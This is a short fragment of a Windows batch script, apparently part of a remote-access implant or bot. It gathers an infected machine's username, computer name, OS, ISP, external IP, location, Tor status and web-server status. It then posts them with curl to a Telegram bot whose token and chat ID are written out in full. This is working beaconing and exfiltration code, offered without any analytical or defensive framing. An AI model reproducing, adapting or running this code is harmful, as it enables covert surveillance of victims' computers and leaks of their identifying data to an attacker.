...
SET "MSG=NEW CONNECTION: %userN%@%computerN% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%]"
for /f "usebackq delims=" %%i in (`powershell -command "$OutputVariable='%MSG%'-replace '[^\x00-\x7F]', ''; $OutputVariable"`) do set "MSG=%%i"

"%environment%\curl.exe" -k %proxy% -F text="%MSG% " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574 >> "%userN%@%computerN%.txt"
